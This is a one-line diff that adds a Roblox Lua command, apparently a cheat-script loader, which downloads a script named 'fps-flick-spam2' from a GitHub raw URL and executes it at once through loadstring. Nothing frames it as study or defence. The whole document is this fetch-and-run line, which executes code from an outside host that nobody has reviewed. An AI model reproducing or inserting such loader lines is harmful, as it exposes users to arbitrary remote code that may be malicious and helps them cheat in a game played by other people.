@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/fps-flick-spam2-dzkvnn78ivo5kh.lua"))()
